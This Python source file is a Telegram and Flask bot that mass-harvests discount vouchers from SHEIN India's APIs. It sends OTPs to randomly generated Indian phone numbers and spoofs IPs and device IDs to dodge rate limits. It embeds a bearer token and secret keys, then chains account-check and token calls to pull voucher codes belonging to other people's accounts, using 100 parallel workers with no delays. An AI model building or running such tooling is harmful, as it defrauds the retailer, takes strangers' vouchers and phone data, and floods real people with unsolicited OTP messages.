#!/usr/bin/env python3
"""
SHEIN Voucher Bot - Ultra Fast Continuous Auto-Collector
Version: 4.0 - Extreme Parallel Processing
Deployment: Render.com Flask compatible
"""

import os
import json
import random
import time
import threading
import asyncio
import logging
import uuid
import hashlib
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, jsonify
from dotenv import load_dotenv

# Try to import Telegram modules
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("⚠️ Telegram module not installed. Install with: pip install python-telegram-bot")

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=os.getenv('LOG_LEVEL', 'INFO')
)
logger = logging.getLogger(__name__)

# Flask app for Render
app = Flask(__name__)

class SheinVoucherBot:
    def __init__(self):
        # Bot configuration
        self.bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        
        # Files configuration
        self.data_dir = "data"
        os.makedirs(self.data_dir, exist_ok=True)
        
        # File paths
        self.nm_file = os.path.join(self.data_dir, "nm.json")
        self.vouchers_file = os.path.join(self.data_dir, "vouchers.json")
        self.users_file = os.path.join(self.data_dir, "users.json")
        
        # Performance settings - MAXIMUM PARALLELISM
        self.max_workers = int(os.getenv('MAX_WORKERS', '100'))  # Extreme parallel processing
        self.request_timeout = int(os.getenv('REQUEST_TIMEOUT', '8'))  # Faster timeout
        self.batch_size = int(os.getenv('BATCH_SIZE', '50'))  # Larger batches
        
        # Ultra Fast Mode settings
        self.continuous_mode = {}
        self.continuous_stats = {}
        self.stop_continuous = {}
        
        # Load data
        self.load_all_data()
        
        # Thread pool for EXTREME parallel processing
        self.executor = ThreadPoolExecutor(max_workers=self.max_workers)
        
        # URLs
        self.send_otp_url = "https://api.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12"
        self.client_token_url = "https://api.sheinindia.in/uaas/jwt/token/client"
        self.account_check_url = "https://api.sheinindia.in/uaas/accountCheck"
        self.creator_token_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        self.user_data_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"
        
        # Thread safety
        self.lock = threading.Lock()
        
        # Performance tracking
        self.requests_per_second = 0
        self.last_request_count = 0
        self.last_request_time = time.time()
        
        # Cache for performance
        self.client_token_cache = None
        self.token_cache_time = 0
        
        logger.info(f"🚀 Ultra Fast Bot initialized with {self.max_workers} workers!")
    
    # ==============================================
    # ULTRA FAST CORE FUNCTIONS
    # ==============================================
    
    def generate_ad_id(self):
        """Generate fresh ad_id - Ultra Fast"""
        return str(uuid.uuid4())
    
    def load_all_data(self):
        """Load all data files - Fast"""
        self.numbers = self.load_json(self.nm_file, [])
        self.vouchers = self.load_json(self.vouchers_file, [])
        self.users = self.load_json(self.users_file, {})
        logger.info(f"📊 Data loaded: {len(self.numbers)} numbers, {len(self.vouchers)} vouchers")
    
    def load_json(self, filename, default):
        """Load JSON file or return default"""
        try:
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except:
            pass
        return default
    
    def save_json(self, filename, data):
        """Save data to JSON file - Fast with lock"""
        try:
            with self.lock:
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
        except:
            pass
    
    def generate_valid_indian_number(self):
        """Generate valid Indian mobile numbers - Ultra Fast"""
        prefixes = ['70', '71', '72', '73', '74', '75', '76', '77', '78', '79',
                   '80', '81', '82', '83', '84', '85', '86', '87', '88', '89',
                   '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']
        
        prefix = random.choice(prefixes)
        number = prefix + ''.join([str(random.randint(0, 9)) for _ in range(8)])
        return number
    
    def random_ip(self):
        """Generate random IP address - Fast"""
        return f"{random.randint(100, 200)}.{random.randint(10, 200)}.{random.randint(10, 200)}.{random.randint(10, 250)}"
    
    def gen_device_id(self):
        """Generate random device ID - Fast"""
        device_str = f"android-{int(time.time())}-{random.randint(10000, 99999)}"
        return hashlib.md5(device_str.encode()).hexdigest().upper()
    
    def random_name(self):
        """Generate random Indian name - Fast"""
        names = ["Aarav", "Ankit", "Rahul", "Rohit", "Aman", "Vikas", "Kunal", "Sahil", "Mohit",
                "Priya", "Neha", "Anjali", "Pooja", "Sneha", "Riya", "Kriti", "Divya", "Shreya"]
        return random.choice(names)
    
    def random_gender(self):
        """Generate random gender - Fast"""
        return random.choice(["MALE", "FEMALE"])
    
    def make_request(self, url, method="POST", data=None, headers=None, timeout=None, retry=1):
        """Make HTTP request with minimal retry - Ultra Fast"""
        if timeout is None:
            timeout = self.request_timeout
        
        try:
            if method.upper() == "POST":
                response = requests.post(url, data=data, headers=headers, 
                                       timeout=timeout, verify=False)
            else:
                response = requests.get(url, headers=headers, 
                                      timeout=timeout, verify=False)
            
            # Update performance counter
            current_time = time.time()
            self.last_request_count += 1
            if current_time - self.last_request_time >= 1:
                self.requests_per_second = self.last_request_count
                self.last_request_count = 0
                self.last_request_time = current_time
            
            return response if response and response.status_code == 200 else None
                
        except Exception as e:
            return None
    
    def send_otp(self, number):
        """Send OTP to number - Ultra Fast"""
        try:
            headers = {
                "X-Tenant": "B2C",
                "Accept": "application/json",
                "User-Agent": "Android",
                "client_type": "Android/35",
                "client_version": "1.0.12",
                "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJjbGllbnQiLCJjbGllbnROYW1lIjoidHJ1c3RlZF9jbGllbnQiLCJyb2xlcyI6W3sibmFtZSI6IlJPTEVfVFJVU1RFRF9DTElFTlQifV0sInRlbmFudElkIjoiU0hFSU4iLCJleHAiOjE3NzE3ODE4MDQsImlhdCI6MTc2OTE4OTgwNH0.HsDutIjo9XEnC6Ju1_MZsjj3v-T52_2K4L0RKdnsNncEAjlNEA4MDEA39yLiGdaDzvNSmAy3fKgQcWE_WTC0RvPhL4_F9bzAFoK6LASjb1LzOKilHAdlFQtUDfZPgCdq9iXg95-v2-qv3vjoF2K47I7i9v_v8EKXO_OfqQILDyBzIqumYE3VRpDG1zJhIUijuDkmIrfsz8w-0m40gccXfsnN5IeRwp_l98l-amUfDs1bI167oWEBi-gGby7Fqzku8FxCicZ17cwhiWTs8kzopkKP1H50cFMBmH7cZR-WNbM_0OBdj4IcxT-2jHm-qoqMCGykud33KFLU2PfS8VU45g",
                "X-TENANT-ID": "SHEIN",
                "ad_id": self.generate_ad_id(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip",
                "Connection": "keep-alive",
                "X-Forwarded-For": self.random_ip()
            }
            
            data = f"mobileNumber={number}"
            response = self.make_request(self.send_otp_url, data=data, headers=headers, timeout=5)
            
            if response:
                result = response.json()
                return result.get("success") is True
            
            return False
            
        except:
            return False
    
    def get_client_token_fast(self):
        """Get client token - Fast with caching"""
        current_time = time.time()
        if self.client_token_cache and (current_time - self.token_cache_time) < 300:  # Cache for 5 minutes
            return self.client_token_cache
        
        device_id = self.gen_device_id()
        ip = self.random_ip()
        
        headers = {
            "Client_type": "Android/29",
            "Client_version": "1.0.8",
            "User-Agent": "Android",
            "X-Tenant-Id": "shein",
            "Ad_id": device_id,
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
        response = self.make_request(self.client_token_url, data=data, headers=headers, timeout=5)
        
        if response:
            try:
                self.client_token_cache = response.json()['access_token']
                self.token_cache_time = current_time
                return self.client_token_cache
            except:
                pass
        return None
    
    def check_account_fast(self, mobile, client_token):
        """Check account - Ultra Fast"""
        ip = self.random_ip()
        
        headers = {
            "Authorization": f"Bearer {client_token}",
            "Client_type": "Android/29",
            "Client_version": "1.0.8",
            "User-Agent": "Android",
            "X-Tenant-Id": "shein",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        data = f"mobileNumber={mobile}"
        response = self.make_request(self.account_check_url, data=data, headers=headers, timeout=5)
        
        if response:
            try:
                return response.json()['encryptedId']
            except:
                pass
        return None
    
    def get_creator_token_fast(self, mobile, encrypted_id):
        """Get creator token - Ultra Fast"""
        ip = self.random_ip()
        
        headers = {
            "Content-Type": "application/json",
            "X-Tenant-Id": "shein",
            "User-Agent": "Android",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        data = {
            "client_type": "Android/29",
            "client_version": "1.0.8",
            "gender": self.random_gender(),
            "phone_number": mobile,
            "secret_key": "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
            "user_id": encrypted_id,
            "user_name": self.random_name()
        }
        
        response = self.make_request(
            self.creator_token_url, 
            data=json.dumps(data), 
            headers=headers,
            timeout=5
        )
        
        if response:
            try:
                return response.json()['access_token']
            except:
                pass
        return None
    
    def get_voucher_fast(self, mobile, encrypted_id, creator_token):
        """Get voucher data - Ultra Fast"""
        ip = self.random_ip()
        
        headers = {
            "Authorization": f"Bearer {creator_token}",
            "X-Encrypted-Id": encrypted_id,
            "Origin": "https://sheinverse.galleri5.com",
            "Referer": "https://sheinverse.galleri5.com/",
            "User-Agent": "Android",
            "X-Forwarded-For": ip,
            "Accept": "application/json"
        }
        
        response = self.make_request(self.user_data_url, method="GET", headers=headers, timeout=5)
        
        if response:
            try:
                data = response.json()
                if 'user_data' in data and 'voucher_data' in data['user_data']:
                    voucher_data = data['user_data']['voucher_data']
                    return {
                        "mobile": mobile,
                        "voucher_code": voucher_data.get('voucher_code', 'N/A'),
                        "amount": voucher_data.get('voucher_amount', 'N/A'),
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
            except:
                pass
        return None
    
    def find_valid_numbers_batch(self, batch_size=10):
        """Find multiple valid numbers in parallel - Ultra Fast"""
        numbers_to_check = [self.generate_valid_indian_number() for _ in range(batch_size)]
        valid_numbers = []
        
        # Send OTPs in parallel
        with ThreadPoolExecutor(max_workers=batch_size) as executor:
            futures = {executor.submit(self.send_otp, num): num for num in numbers_to_check}
            
            for future in as_completed(futures):
                number = futures[future]
                try:
                    if future.result():
                        valid_numbers.append(number)
                except:
                    pass
        
        # Save new numbers
        if valid_numbers:
            with self.lock:
                new_numbers = [num for num in valid_numbers if num not in self.numbers]
                self.numbers.extend(new_numbers)
                if new_numbers:
                    self.save_json(self.nm_file, self.numbers)
        
        return valid_numbers
    
    def process_numbers_for_vouchers_parallel(self, numbers):
        """Process multiple numbers for vouchers in parallel - Ultra Fast"""
        vouchers = []
        
        def process_single(number):
            try:
                client_token = self.get_client_token_fast()
                if not client_token:
                    return None
                
                encrypted_id = self.check_account_fast(number, client_token)
                if not encrypted_id:
                    return None
                
                creator_token = self.get_creator_token_fast(number, encrypted_id)
                if not creator_token:
                    return None
                
                voucher = self.get_voucher_fast(number, encrypted_id, creator_token)
                return voucher
            except:
                return None
        
        # Process in parallel
        with ThreadPoolExecutor(max_workers=len(numbers)) as executor:
            futures = {executor.submit(process_single, num): num for num in numbers}
            
            for future in as_completed(futures):
                try:
                    voucher = future.result()
                    if voucher:
                        vouchers.append(voucher)
                except:
                    pass
        
        return vouchers
    
    # ==============================================
    # ULTRA FAST CONTINUOUS MODE
    # ==============================================
    
    async def run_ultra_fast_continuous(self, user_id, chat_id=None):
        """Ultra Fast Continuous Collection - NO DELAYS"""
        try:
            batch_count = 0
            total_vouchers = 0
            total_value = 0
            
            # Initial message
            if chat_id and TELEGRAM_AVAILABLE:
                await self.send_telegram_message(
                    chat_id,
                    "🚀 *ULTRA FAST MODE ACTIVATED*\n\n"
                    "Starting extreme parallel collection...\n"
                    "• No delays between requests\n"
                    "• Maximum parallel processing\n"
                    "• Real-time results\n\n"
                    "⚡ Processing at maximum speed!",
                    parse_mode="Markdown"
                )
            
            while self.continuous_mode.get(user_id, False) and not self.stop_continuous.get(user_id, False):
                try:
                    batch_count += 1
                    
                    # Step 1: Find valid numbers (Parallel)
                    valid_numbers = self.find_valid_numbers_batch(self.batch_size)
                    
                    if not valid_numbers:
                        continue
                    
                    # Step 2: Process for vouchers (Parallel)
                    batch_vouchers = self.process_numbers_for_vouchers_parallel(valid_numbers)
                    
                    if batch_vouchers:
                        # Save vouchers
                        with self.lock:
                            self.vouchers.extend(batch_vouchers)
                            self.save_json(self.vouchers_file, self.vouchers)
                        
                        # Update stats
                        total_vouchers += len(batch_vouchers)
                        for voucher in batch_vouchers:
                            try:
                                amount = float(str(voucher["amount"]).replace("₹", "").replace(",", "").strip())
                                total_value += amount
                            except:
                                pass
                        
                        # Update continuous stats
                        if user_id in self.continuous_stats:
                            self.continuous_stats[user_id]["vouchers_found"] += len(batch_vouchers)
                            self.continuous_stats[user_id]["total_value"] += total_value
                            self.continuous_stats[user_id]["total_attempts"] += len(valid_numbers)
                        
                        # Send notification if Telegram is available
                        if chat_id and TELEGRAM_AVAILABLE and len(batch_vouchers) > 0:
                            try:
                                await self.send_telegram_message(
                                    chat_id,
                                    f"✅ *Batch #{batch_count} Complete*\n\n"
                                    f"• Numbers checked: {len(valid_numbers)}\n"
                                    f"• Vouchers found: {len(batch_vouchers)}\n"
                                    f"• Success rate: {(len(batch_vouchers)/len(valid_numbers))*100:.1f}%\n"
                                    f"• Total so far: {total_vouchers} vouchers\n"
                                    f"• Total value: ₹{total_value:.2f}\n\n"
                                    f"⚡ RPS: {self.requests_per_second}/sec",
                                    parse_mode="Markdown"
                                )
                            except:
                                pass
                    
                    # NO SLEEP - CONTINUOUS PROCESSING
                    # Just yield control briefly to prevent blocking
                    await asyncio.sleep(0.001)
                    
                except Exception as e:
                    logger.error(f"Batch error: {e}")
                    # Continue anyway
                    await asyncio.sleep(0.1)
            
            # Final message
            if chat_id and TELEGRAM_AVAILABLE:
                await self.send_telegram_message(
                    chat_id,
                    f"⏹️ *Ultra Fast Mode Stopped*\n\n"
                    f"📊 *Final Results:*\n"
                    f"• Total batches: {batch_count}\n"
                    f"• Total vouchers: {total_vouchers}\n"
                    f"• Total value: ₹{total_value:.2f}\n"
                    f"• Max RPS: {self.requests_per_second}/sec\n\n"
                    f"✅ All data saved successfully!",
                    parse_mode="Markdown"
                )
            
        except Exception as e:
            logger.error(f"Continuous mode fatal error: {e}")
    
    async def send_telegram_message(self, chat_id, text, parse_mode=None):
        """Send Telegram message"""
        try:
            from telegram.error import TelegramError
            from telegram.constants import ParseMode
            
            if not hasattr(self, 'application') or not self.application:
                return
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode=parse_mode or ParseMode.MARKDOWN
            )
        except TelegramError as e:
            logger.error(f"Telegram send error: {e}")
        except Exception as e:
            logger.error(f"Message send error: {e}")
    
    # ==============================================
    # TELEGRAM BOT HANDLERS (Simplified)
    # ==============================================
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user_id = str(update.effective_user.id)
        
        # Save user
        if user_id not in self.users:
            self.users[user_id] = {
                "username": update.effective_user.username,
                "first_name": update.effective_user.first_name,
                "join_date": datetime.now().isoformat()
            }
            self.save_json(self.users_file, self.users)
        
        keyboard = [
            [InlineKeyboardButton("🚀 ULTRA FAST MODE", callback_data="ultra_fast")],
            [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
            [InlineKeyboardButton("🎫 My Vouchers", callback_data="vouchers")],
            [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🚀 *SHEIN Voucher Bot - ULTRA FAST*\n\n"
            "⚡ Extreme parallel processing\n"
            "🔥 No delays between requests\n"
            "💨 Maximum speed collection\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button clicks"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(update.effective_user.id)
        
        if query.data == "ultra_fast":
            await self.start_ultra_fast_mode(query, user_id)
        elif query.data == "stats":
            await self.show_stats(query)
        elif query.data == "vouchers":
            await self.show_vouchers(query, user_id)
        elif query.data == "stop_fast":
            await self.stop_ultra_fast_mode(query, user_id)
        elif query.data == "settings":
            await self.show_settings(query)
    
    async def start_ultra_fast_mode(self, query, user_id):
        """Start Ultra Fast mode"""
        if self.continuous_mode.get(user_id, False):
            await query.edit_message_text(
                "🟢 *Already Running*\n\n"
                "Ultra Fast mode is already active!",
                parse_mode="Markdown"
            )
            return
        
        # Initialize
        self.continuous_mode[user_id] = True
        self.stop_continuous[user_id] = False
        self.continuous_stats[user_id] = {
            "start_time": time.time(),
            "vouchers_found": 0,
            "total_value": 0,
            "total_attempts": 0
        }
        
        keyboard = [
            [InlineKeyboardButton("⏹️ STOP ULTRA FAST", callback_data="stop_fast")],
            [InlineKeyboardButton("📊 Live Stats", callback_data="stats")]
        ]
        
        await query.edit_message_text(
            "🚀 *ACTIVATING ULTRA FAST MODE*\n\n"
            "Starting extreme parallel processing...\n"
            "• Max workers: 100\n"
            "• Batch size: 50\n"
            "• No delays\n"
            "• Maximum speed\n\n"
            "⚡ Processing at full throttle!",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        
        # Start in background
        asyncio.create_task(self.run_ultra_fast_continuous(user_id, query.message.chat_id))
    
    async def stop_ultra_fast_mode(self, query, user_id):
        """Stop Ultra Fast mode"""
        if not self.continuous_mode.get(user_id, False):
            await query.edit_message_text(
                "⚠️ *Not Running*\n\n"
                "Ultra Fast mode is not active.",
                parse_mode="Markdown"
            )
            return
        
        self.stop_continuous[user_id] = True
        await query.edit_message_text(
            "⏹️ *Stopping Ultra Fast Mode*\n\n"
            "Please wait while we finalize...",
            parse_mode="Markdown"
        )
    
    async def show_stats(self, query):
        """Show statistics"""
        total_vouchers = len(self.vouchers)
        total_users = len(self.users)
        
        total_value = 0
        for voucher in self.vouchers:
            try:
                amount = str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip()
                total_value += float(amount)
            except:
                pass
        
        keyboard = [
            [InlineKeyboardButton("🚀 Start Ultra Fast", callback_data="ultra_fast")],
            [InlineKeyboardButton("🔄 Refresh", callback_data="stats")]
        ]
        
        await query.edit_message_text(
            f"📊 *Bot Statistics*\n\n"
            f"• Total vouchers: {total_vouchers}\n"
            f"• Total value: ₹{total_value:.2f}\n"
            f"• Total users: {total_users}\n"
            f"• Valid numbers: {len(self.numbers)}\n"
            f"• Current RPS: {self.requests_per_second}/sec\n\n"
            f"⚡ *Performance:*\n"
            f"• Max workers: {self.max_workers}\n"
            f"• Batch size: {self.batch_size}\n"
            f"• Timeout: {self.request_timeout}s",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    
    async def show_vouchers(self, query, user_id):
        """Show vouchers"""
        user_vouchers = []
        total_value = 0
        
        for voucher in self.vouchers:
            if voucher.get('user_id') == user_id:
                user_vouchers.append(voucher)
                try:
                    amount = str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip()
                    total_value += float(amount)
                except:
                    pass
        
        if not user_vouchers:
            keyboard = [
                [InlineKeyboardButton("🚀 Get Vouchers", callback_data="ultra_fast")],
                [InlineKeyboardButton("📊 Stats", callback_data="stats")]
            ]
            
            await query.edit_message_text(
                "📭 *No Vouchers Yet*\n\n"
                "You haven't collected any vouchers yet.\n"
                "Start Ultra Fast mode to collect!",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="Markdown"
            )
            return
        
        # Show recent 10 vouchers
        recent = user_vouchers[-10:] if len(user_vouchers) > 10 else user_vouchers
        vouchers_text = "\n".join([f"• `{v['voucher_code']}` - ₹{v['amount']}" for v in recent])
        
        keyboard = [
            [InlineKeyboardButton("🚀 Get More", callback_data="ultra_fast")],
            [InlineKeyboardButton("📊 Stats", callback_data="stats")]
        ]
        
        await query.edit_message_text(
            f"🎫 *Your Vouchers*\n\n"
            f"• Total: {len(user_vouchers)}\n"
            f"• Value: ₹{total_value:.2f}\n\n"
            f"*Recent vouchers:*\n{vouchers_text}",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    
    async def show_settings(self, query):
        """Show settings"""
        keyboard = [
            [InlineKeyboardButton("🚀 Ultra Fast Mode", callback_data="ultra_fast")],
            [InlineKeyboardButton("📊 Stats", callback_data="stats")]
        ]
        
        await query.edit_message_text(
            f"⚙️ *Bot Settings*\n\n"
            f"*Performance Settings:*\n"
            f"• Max Workers: {self.max_workers}\n"
            f"• Batch Size: {self.batch_size}\n"
            f"• Request Timeout: {self.request_timeout}s\n\n"
            f"*Current Status:*\n"
            f"• Requests/sec: {self.requests_per_second}\n"
            f"• Total Vouchers: {len(self.vouchers)}\n"
            f"• Active Users: {len([uid for uid, active in self.continuous_mode.items() if active])}",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    
    def run_telegram_bot(self):
        """Run Telegram bot"""
        if not TELEGRAM_AVAILABLE:
            logger.error("Telegram bot not available")
            return
        
        if not self.bot_token:
            logger.error("No bot token provided")
            return
        
        # Create application
        application = Application.builder().token(self.bot_token).build()
        
        # Store application instance for sending messages
        self.application = application
        
        # Add handlers
        application.add_handler(CommandHandler("start", self.start_command))
        application.add_handler(CallbackQueryHandler(self.button_handler))
        
        # Start bot
        logger.info("Starting Telegram bot...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    
    def start_auto_collector(self):
        """Start auto-collector without Telegram"""
        logger.info("🚀 Starting Ultra Fast Auto-Collector...")
        
        # Create a dummy user for auto-collection
        auto_user_id = "auto_collector"
        self.continuous_mode[auto_user_id] = True
        self.continuous_stats[auto_user_id] = {
            "start_time": time.time(),
            "vouchers_found": 0,
            "total_value": 0,
            "total_attempts": 0
        }
        
        # Run in background
        asyncio.create_task(self.run_ultra_fast_continuous(auto_user_id))

# ==============================================
# FLASK ROUTES FOR RENDER
# ==============================================

bot_instance = SheinVoucherBot()

@app.route('/')
def home():
    """Home route for Render"""
    total_vouchers = len(bot_instance.vouchers)
    total_value = 0
    for voucher in bot_instance.vouchers:
        try:
            amount = str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip()
            total_value += float(amount)
        except:
            pass
    
    return jsonify({
        "status": "running",
        "vouchers_collected": total_vouchers,
        "total_value": f"₹{total_value:.2f}",
        "requests_per_second": bot_instance.requests_per_second,
        "active_users": len([uid for uid, active in bot_instance.continuous_mode.items() if active]),
        "uptime": "24/7"
    })

@app.route('/health')
def health():
    """Health check for Render"""
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/stats')
def stats():
    """Statistics endpoint"""
    total_vouchers = len(bot_instance.vouchers)
    total_users = len(bot_instance.users)
    total_numbers = len(bot_instance.numbers)
    
    total_value = 0
    for voucher in bot_instance.vouchers:
        try:
            amount = str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip()
            total_value += float(amount)
        except:
            pass
    
    return jsonify({
        "total_vouchers": total_vouchers,
        "total_value": total_value,
        "total_users": total_users,
        "valid_numbers": total_numbers,
        "requests_per_second": bot_instance.requests_per_second,
        "performance": {
            "max_workers": bot_instance.max_workers,
            "batch_size": bot_instance.batch_size,
            "timeout": bot_instance.request_timeout
        }
    })

@app.route('/start_collector', methods=['POST'])
def start_collector():
    """Start auto-collector"""
    bot_instance.start_auto_collector()
    return jsonify({"status": "started", "message": "Ultra Fast collector started"})

# ==============================================
# MAIN ENTRY POINT
# ==============================================

def main():
    """Main function"""
    # Start auto-collector in background
    bot_instance.start_auto_collector()
    
    # Start Telegram bot if token is provided
    if bot_instance.bot_token and TELEGRAM_AVAILABLE:
        bot_instance.run_telegram_bot()
    else:
        # Just run Flask for Render
        port = int(os.environ.get('PORT', 8080))
        app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == "__main__":
    main()
